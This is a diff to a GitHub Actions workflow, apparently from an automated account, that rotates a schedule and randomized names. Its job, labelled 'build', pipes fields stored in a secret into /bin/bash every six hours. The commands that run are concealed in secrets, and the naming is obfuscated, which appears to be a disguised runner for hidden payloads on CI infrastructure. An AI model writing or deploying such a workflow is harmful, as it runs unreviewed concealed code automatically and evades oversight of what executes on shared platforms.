@@ -3,24 +3,24 @@ name: lianglingxiao5432
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 0/6 * * *'
+    - cron: '50 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lianglingxiao5432
         env:
-          k1: ${{ secrets.k1 }}
+          mx4: ${{ secrets.mx4 }}
         run: |
-          echo $k1 | jq -r .bcyog4310 | /bin/bash
-          echo $v14917 | jq -r .k44851 | /bin/bash
-          echo $ghx03 | jq -r .coqxc4 | /bin/bash
-          echo $p1 | jq -r .edvuj51768 | /bin/bash
-          echo $z65053 | jq -r .annc1496 | /bin/bash
-          echo $f4 | jq -r .wn2114 | /bin/bash
-          echo $ugi23490 | jq -r .utrg6 | /bin/bash
-          echo $yrs597 | jq -r .kuyj755 | /bin/bash
+          echo $mx4 | jq -r .revh43370 | /bin/bash
+          echo $uzck79 | jq -r .qp35829 | /bin/bash
+          echo $wk73334 | jq -r .fnzei19 | /bin/bash
+          echo $flxr478 | jq -r .yiysp220 | /bin/bash
+          echo $pkbu37384 | jq -r .c2216 | /bin/bash
+          echo $cfiii10 | jq -r .amxz8354 | /bin/bash
+          echo $qto0 | jq -r .faca09 | /bin/bash
+          echo $siky7759 | jq -r .fiat38 | /bin/bash
+          echo $apd02923 | jq -r .t5 | /bin/bash
 
